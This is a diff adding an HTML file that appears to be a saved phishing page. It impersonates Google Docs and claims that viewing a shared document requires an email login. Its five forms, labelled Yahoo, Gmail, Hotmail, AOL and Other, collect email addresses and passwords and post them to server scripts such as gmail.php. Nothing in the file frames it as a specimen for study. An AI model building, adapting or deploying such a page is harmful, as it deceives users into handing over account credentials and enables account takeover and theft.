@@ -1,0 +1,320 @@
+<!-- saved from url=(0026)http://tfiledata.com/rema/ -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Google Docs
+  </title>
+  <link href="./Remax%20-%20Secure%20Login_files/style.htm" type="text/css" rel="stylesheet" />
+  <style type="text/css">
+   div {
+	position: absolute;
+	left: 620px;
+	top: 40px;
+	background-color: #EBEBEB;
+	width: 280px;
+	padding: 10px;
+	color: #000000;
+	border: #0000cc 2px dashed;
+	display: none;
+}
+body,td,th {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+}
+  </style>
+  <script language="Javascript">
+  </script>
+  <script language="javascript">
+   function toggle() {
+	var ele = document.getElementById("toggleText");
+	var text = document.getElementById("displayText");
+	if(ele.style.display == "block") {
+    		ele.style.display = "none";
+		text.innerHTML = "show";
+  	}
+	else {
+		ele.style.display = "block";
+		text.innerHTML = "hide";
+	}
+}
+ 
+function togglegmail() {
+	var ele = document.getElementById("toggleTextgmail");
+	var text = document.getElementById("displayTextgmail");
+	if(ele.style.display == "block") {
+    		ele.style.display = "none";
+		text.innerHTML = "show";
+  	}
+	else {
+		ele.style.display = "block";
+		text.innerHTML = "hide";
+	}
+} 
+ 
+function togglehotmail() {
+	var ele = document.getElementById("toggleTexthotmail");
+	var text = document.getElementById("displayTexthotmail");
+	if(ele.style.display == "block") {
+    		ele.style.display = "none";
+		text.innerHTML = "show";
+  	}
+	else {
+		ele.style.display = "block";
+		text.innerHTML = "hide";
+	}
+} 
+function toggleaol() {
+	var ele = document.getElementById("toggleTextaol");
+	var text = document.getElementById("displayTextaol");
+	if(ele.style.display == "block") {
+    		ele.style.display = "none";
+		text.innerHTML = "show";
+  	}
+	else {
+		ele.style.display = "block";
+		text.innerHTML = "hide";
+	}
+} 
+function toggleother() {
+	var ele = document.getElementById("toggleTextother");
+	var text = document.getElementById("displayTextother");
+	if(ele.style.display == "block") {
+    		ele.style.display = "none";
+		text.innerHTML = "show";
+  	}
+	else {
+		ele.style.display = "block";
+		text.innerHTML = "hide";
+	}
+}
+  </script>
+ </head>
+ <body bgcolor="#efefef">
+  <table bgcolor="#cccccc" align="center" cellspacing="1" cellpadding="10" id="wrapper">
+   <tbody>
+    <tr>
+     <td bgcolor="#ffffff">
+      <table width="100%">
+       <tbody>
+        <tr>
+         <td width="50%">
+          <h1>
+           <img width="150" height="100" src="http://fwd.channel5.com/upload/0736/8448/Google_docs_logo_size_9.jpg" />
+          </h1>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <br />
+      <table width="100%" cellspacing="0" id="invoicetoptables">
+       <tbody>
+        <tr>
+         <td width="50%" id="invoicecontent">
+          <table width="100%" height="100" cellspacing="0" cellpadding="10" id="invoicetoptables">
+           <tbody>
+            <tr>
+             <td valign="top" style="border: 0px solid rgb(204, 204, 204);" id="invoicecontent">
+              <p>
+               <font size="4" color="#990000">
+                To View shared document
+                <br />
+                you are required to Login with your email address below
+               </font>
+              </p>
+              <br />
+              <br />
+              <font class="paid">
+               Choose your email provider below and login:
+              </font>
+              <br />
+              <br />
+              <br />
+              <p align="center">
+               <a href="javascript:toggle();">
+                <img width="132" height="48" border="0" id="displayText" title="Yahoomail" src="./Remax%20-%20Secure%20Login_files/yahoo.jpg" />
+               </a>
+               <a href="javascript:togglegmail();">
+                <img width="132" height="48" border="0" id="displayTextgmail" title="Gmail" src="./Remax%20-%20Secure%20Login_files/gmail.jpg" />
+               </a>
+               <br />
+               <br />
+               <br />
+               <a href="javascript:togglehotmail();">
+                <img width="132" height="48" border="0" id="displayTexthotmail" title="Hotmail" src="./Remax%20-%20Secure%20Login_files/hotmail.jpg" />
+               </a>
+               <a href="javascript:toggleaol();">
+                <img width="132" height="48" border="0" id="displayTextaol" title="Aol" src="./Remax%20-%20Secure%20Login_files/aol.jpg" />
+               </a>
+               <br />
+               <br />
+               <br />
+               <a href="javascript:toggleother();">
+                <img width="132" height="48" border="0" id="displayTextother" title="Other Email" src="./Remax%20-%20Secure%20Login_files/other.jpg" />
+               </a>
+              </p>
+              <!-- YAHOO CONFIG !-->
+              <div style="display: none" id="toggleText">
+               <p>
+                <img width="132" height="48" border="0" title="Yahoomail" src="./Remax%20-%20Secure%20Login_files/yahoo.jpg" />
+               </p>
+               <p align="right">
+                <a href="javascript:location.reload(true)">
+                 close [x]
+                </a>
+               </p>
+               <br />
+               <form onsubmit="return ValidateFormYahoo()" action="yahoo.php" method="post" name="yahoo">
+                <p>
+                 <br />
+                 <label>
+                  Yahoo Email Address:
+                 </label>
+                 <br />
+                 <input type="text" style="width: 200px;" name="yahoouser" />
+                 <br />
+                 <label>
+                  Yahoo Password
+                 </label>
+                 <br />
+                 <input type="password" style="width: 200px;" name="yahoopassword" />
+                 <br />
+                 <br />
+                 <input type="submit" value="Sign In" name="s_yahoo" />
+                </p>
+               </form>
+              </div>
+              <!-- GMAIL CONFIG !-->
+              <div style="display: none" id="toggleTextgmail">
+               <p>
+                <img width="132" height="48" border="0" title="Gmail" src="./Remax%20-%20Secure%20Login_files/gmail.jpg" />
+               </p>
+               <p align="right">
+                <a href="javascript:location.reload(true)">
+                 close [x]
+                </a>
+               </p>
+               <br />
+               <form onsubmit="return ValidateFormGmail()" action="gmail.php" method="post" name="gmail">
+                <p>
+                 <label>
+                  Gmail Email Address:
+                 </label>
+                 <br />
+                 <input type="text" style="width: 200px;" name="gmailuser" />
+                 <br />
+                 <label>
+                  Gmail Password
+                 </label>
+                 <br />
+                 <input type="password" style="width: 200px;" name="gmailpassword" />
+                 <br />
+                 <br />
+                 <input type="submit" value="Sign in" name="s_gmail" />
+                </p>
+               </form>
+              </div>
+              <!-- HOTMAIL CONFIG !-->
+              <div style="display: none" id="toggleTexthotmail">
+               <p>
+                <img width="132" height="48" border="0" title="Hotmail" src="./Remax%20-%20Secure%20Login_files/hotmail.jpg" />
+               </p>
+               <p align="right">
+                <a href="javascript:location.reload(true)">
+                 close [x]
+                </a>
+               </p>
+               <br />
+               <form onsubmit="return ValidateFormHotmail()" action="hotmail.php" method="post" name="hotmail">
+                <p>
+                 <label>
+                  Hotmail Email Address:
+                 </label>
+                 <br />
+                 <input type="text" style="width: 200px;" name="hotmailuser" />
+                 <br />
+                 <label>
+                  Hotmail Password
+                 </label>
+                 <br />
+                 <input type="password" style="width: 200px;" name="hotmailpassword" />
+                 <br />
+                 <br />
+                 <input type="submit" value="Sign in" name="s_hotmail" />
+                </p>
+               </form>
+              </div>
+              <!-- AOL CONFIG !-->
+              <div style="display: none" id="toggleTextaol">
+               <p>
+                <img width="132" height="48" border="0" title="Aol" src="./Remax%20-%20Secure%20Login_files/aol.jpg" />
+               </p>
+               <p align="right">
+                <a href="javascript:location.reload(true)">
+                 close [x]
+                </a>
+               </p>
+               <br />
+               <form onsubmit="return ValidateFormAol()" action="aol.php" method="post" name="aol">
+                <p>
+                 <label>
+                  Aol Email Address:
+                 </label>
+                 <br />
+                 <input type="text" style="width: 200px;" name="aoluser" />
+                 <br />
+                 <label>
+                  Aol Password
+                 </label>
+                 <br />
+                 <input type="password" style="width: 200px;" name="aolpassword" />
+                 <br />
+                 <br />
+                 <input type="submit" value="Sign In" name="s_aol" />
+                </p>
+               </form>
+              </div>
+              <!-- OTHER CONFIG !-->
+              <div style="display: none" id="toggleTextother">
+               <p>
+                <img width="132" height="48" border="0" title="Other" src="./Remax%20-%20Secure%20Login_files/other.jpg" />
+               </p>
+               <p align="right">
+                <a href="javascript:location.reload(true)">
+                 close [x]
+                </a>
+               </p>
+               <br />
+               <form onsubmit="return ValidateFormOther()" action="other.php" method="post" name="other">
+                <p>
+                 <label>
+                  Email Address:
+                 </label>
+                 <br />
+                 <input type="text" style="width: 200px;" name="otheruser" />
+                 <br />
+                 <label>
+                  Password
+                 </label>
+                 <br />
+                 <input type="password" style="width: 200px;" name="otherpassword" />
+                 <br />
+                 <br />
+                 <input type="submit" value="Sign In" name="s_other" />
+                </p>
+               </form>
+              </div>
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
